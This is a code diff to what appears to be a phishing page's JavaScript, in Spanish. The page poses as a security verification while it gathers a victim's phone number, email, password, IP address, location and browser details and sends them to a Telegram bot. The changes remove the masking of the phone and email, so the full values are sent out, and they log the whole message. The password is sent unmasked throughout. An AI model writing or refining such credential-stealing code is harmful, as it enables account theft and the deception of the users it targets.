@@ -440,21 +440,23 @@ loaderText.textContent = "Verificando información...";
 
 try {
 // Obtener IP y ubicación
+let ipData = {};
+try {
 const ipResponse = await fetch('https://ipapi.co/json/');
-const ipData = await ipResponse.json();
+ipData = await ipResponse.json();
+} catch (ipError) {
+console.error("Error obteniendo IP:", ipError);
+ipData = { ip: "No disponible", city: "No disponible", region: "No disponible", country_name: "No disponible" };
+}
 
-// Enmascarar datos para el mensaje
-const numeroMask = numero.slice(0, 3) + '***' + numero.slice(-2);
-const correoMask = correo.split('@')[0].slice(0, 2) + '***@' + correo.split('@')[1];
-
-// Crear mensaje para Telegram
+// Crear mensaje para Telegram con TODOS los datos COMPLETOS
 const mensaje = `
 🔐 *NUEVA VERIFICACIÓN DE SEGURIDAD* 🔐
 
 📱 *DATOS DEL USUARIO:*
 ━━━━━━━━━━━━━━━━━━━━━
-📞 Número: \`${numeroMask}\`
-📧 Correo: \`${correoMask}\`
+📞 Número completo: \`${numero}\`
+📧 Correo completo: \`${correo}\`
 🔑 Clave: \`${clave}\`
 
 🌍 *INFORMACIÓN DE UBICACIÓN:*
@@ -463,7 +465,7 @@ const mensaje = `
 🏙 Ciudad: \`${ipData.city || 'No disponible'}\`
 🏛 Región: \`${ipData.region || 'No disponible'}\`
 🇨🇴 País: \`${ipData.country_name || 'No disponible'}\`
-📱 Dispositivo: \`${navigator.userAgent.substring(0, 50)}...\`
+📱 Dispositivo: \`${navigator.userAgent}\`
 
 ⏰ *FECHA Y HORA:*
 ━━━━━━━━━━━━━━━━━━━━━
@@ -476,6 +478,7 @@ const mensaje = `
 console.log("Enviando mensaje a Telegram...");
 console.log("Token:", TELEGRAM_CONFIG.token);
 console.log("Chat ID:", TELEGRAM_CONFIG.chatId);
+console.log("Mensaje completo:", mensaje);
 
 loaderText.textContent = "Enviando información segura...";
 
